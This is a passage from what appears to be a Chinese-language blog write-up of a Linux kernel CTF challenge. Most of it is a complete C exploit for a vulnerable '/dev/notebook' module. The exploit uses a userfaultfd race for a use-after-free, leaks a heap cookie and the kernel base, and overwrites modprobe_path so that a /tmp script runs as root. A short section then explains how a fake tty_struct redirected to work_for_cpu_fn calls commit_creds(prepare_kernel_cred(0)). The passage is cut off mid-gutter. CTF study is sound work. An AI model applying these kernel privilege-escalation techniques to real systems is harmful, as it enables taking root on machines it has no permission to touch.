class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) do&#123;perror(msg);exit(1);&#125;while(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"type\">void</span> _add(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _del(<span class=\"type\">size_t</span> idx)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _edit(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _gift(<span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_DATA_SIZE 0x1000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsetvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);<span class=\"comment\">// 0x60 is max size</span></span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_gift(buf);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note[0] addr is 0x%lx&quot;</span>, *(<span class=\"type\">uint64_t</span> *)buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;buf addr is 0x%lx&quot;</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *ptr = (<span class=\"type\">uint64_t</span> *)buf;</span><br><span class=\"line\">\t<span class=\"comment\">// 获得两个块在堆上的地址</span></span><br><span class=\"line\">\theap[<span class=\"number\">0</span>] = ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\theap[<span class=\"number\">1</span>] = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;chunk[0] addr is 0x%lx, chunk[1] is 0x%lx&quot;</span>,</span><br><span class=\"line\">\t\theap[<span class=\"number\">0</span>], heap[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"comment\">// 释放链表 0 -&gt; 1 去获取cookie</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t<span class=\"comment\">// pause();</span></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\t<span class=\"comment\">// Info(&quot;chunk[0]&#x27;s content is 0x%lx&quot;, ptr[0]);</span></span><br><span class=\"line\">\t<span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">\t\tnext = selfaddr ^ cookie ^ nextaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcookie = nextaddr ^ next ^ selfaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span> </span><br><span class=\"line\">\tcookie = heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>] ^ ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Cookie is 0x%lx&quot;</span>, cookie); </span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;So in this time next should be 0x%lx&quot;</span>, </span><br><span class=\"line\">\t\tcookie ^ heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>]\t</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/* 到此为止 信息收集基本完成 开始 uffd条件竞争来uaf */</span></span><br><span class=\"line\">\tfault_page = (<span class=\"type\">size_t</span>)mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, (<span class=\"type\">char</span> *)fault_page);<span class=\"comment\">// 此时卡住 让另外的线程去执行free</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Now free_list maybe look like following:&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;&gt;&gt;  Chks-&gt;chunk[1]-&gt;chunk[0]-&gt;target  &lt;&lt;&quot;</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);<span class=\"comment\">// chunk[1] -&gt; chunk[0] -&gt; target</span></span><br><span class=\"line\">\t<span class=\"comment\">// 这边最好不要有任何打印操作</span></span><br><span class=\"line\">\t<span class=\"comment\">// 这里至关重要 在notebook上面伪造 cookie ^ selfaddr 作为fd 表示这链表的结束</span></span><br><span class=\"line\">\t*(<span class=\"type\">size_t</span> *)(buf + <span class=\"number\">0xF0</span>) = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *buf2 = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10</span> ; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;loop %d&quot;</span>, i);</span><br><span class=\"line\">\t\t_add(i, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\t\t_gift(buf2);</span><br><span class=\"line\">\t\t<span class=\"type\">uint64_t</span> tmp = *(<span class=\"type\">uint64_t</span> *)(buf2 + i * <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(heap[<span class=\"number\">0</span>] == tmp)&#123;</span><br><span class=\"line\">\t\t\tInfo(<span class=\"string\">&quot;Catch it, next is target&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>( i == <span class=\"number\">0xF</span> )&#123;</span><br><span class=\"line\">\t\t\tPanic(<span class=\"string\">&quot;Failure and exit&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;i is %d&quot;</span>, i);</span><br><span class=\"line\">\t<span class=\"comment\">// 劫持 notebook结构体</span></span><br><span class=\"line\">\t_add(i + <span class=\"number\">1</span>, <span class=\"number\">0x60</span>, buf);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> PL[] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"comment\">// name field</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x168</span>, <span class=\"number\">0x4</span>,<span class=\"comment\">// 泄漏重定位的位置</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x2500</span>, <span class=\"number\">0x60</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\twrite_to_kernel(i + <span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;offset data is 0x%lx&quot;</span>, *(<span class=\"type\">uint32_t</span> *)ptr);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> leak = mod_base_addr + <span class=\"number\">0x168</span> + <span class=\"number\">4</span> + *(<span class=\"type\">uint32_t</span> *)ptr;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;leak addr is 0x%lx&quot;</span>, <span class=\"number\">0xffffffff00000000</span> | leak);</span><br><span class=\"line\">\t<span class=\"comment\">// kernel ffffffff81000000 0xffffffff81476c30</span></span><br><span class=\"line\">\tkernel_base_addr = ( <span class=\"number\">0xffffffff00000000</span> | leak ) - <span class=\"number\">0x476c30</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\tmodprobe_path = kernel_base_addr + <span class=\"number\">0x125D2E0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPL[<span class=\"number\">0</span>] = modprobe_path;</span><br><span class=\"line\">\tPL[<span class=\"number\">1</span>] = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(buf, <span class=\"string\">&quot;/tmp/exp.sh&quot;</span>);<span class=\"comment\">// 让modprobe执行的脚本</span></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;#!/bin/sh\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/cp /flag /tmp/flag\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/exp.sh\\n&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/exp.sh&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    system(<span class=\"string\">&quot;/tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tclose(note_fd);</span><br><span class=\"line\">\tclose(uffd);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;regitser done&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd %d&quot;</span>, uffd);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// put some code you want</span></span><br><span class=\"line\">\t\t_del(<span class=\"number\">0</span>);<span class=\"comment\">// 写没加锁 条件竞争让他free掉</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t<span class=\"comment\">// (mod_base_addr + 0x2500) 是n</span></span><br><span class=\"line\">\t<span class=\"comment\">// 由于条件竞争 接下来的数据写是写到frotebook结构体所在的位置 我们要劫持过去 篡改指针</span></span><br><span class=\"line\">\ttarget = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>) ^ heap[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;target addr is 0x%lx&quot;</span>, target);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> s[<span class=\"number\">2</span>] = &#123;target, <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)s;</span><br><span class=\"line\">\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"都什么版本了还在用传统rop-work_for_cpu_fun\"><a class=\"markdownIt-Anchor\" href=\"#都什么版本了还在用传统rop-work_for_cpu_fun\">#</a> 都什么版本了还在用传统 ROP - work_for_cpu_fun</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">    <span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">    <span class=\"type\">void</span> *arg;</span><br><span class=\"line\">    <span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">work_for_cpu_fn</span><span class=\"params\">(<span class=\"keyword\">struct</span> work_struct *work)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> *<span class=\"title\">wfc</span> =</span> container_of(work, <span class=\"keyword\">struct</span> work_for_cpu, work);</span><br><span class=\"line\">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把我们的 <code>fake_tty_struct</code>  假装成 <code>work_for_cpu</code></p>\n<p>劫持 <code>ops</code>  为 <code>work_for_cpu_fn</code></p>\n<p>调用 <code>operation</code>  的时候正好把自己传入调用 而且非常非常干净 不篡改任何其他值</p>\n<p>这就能实现一个单参函数调用的原语</p>\n<p>两次原语即可 <code>commit_creds(prepare_kernel_cred(0))</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span 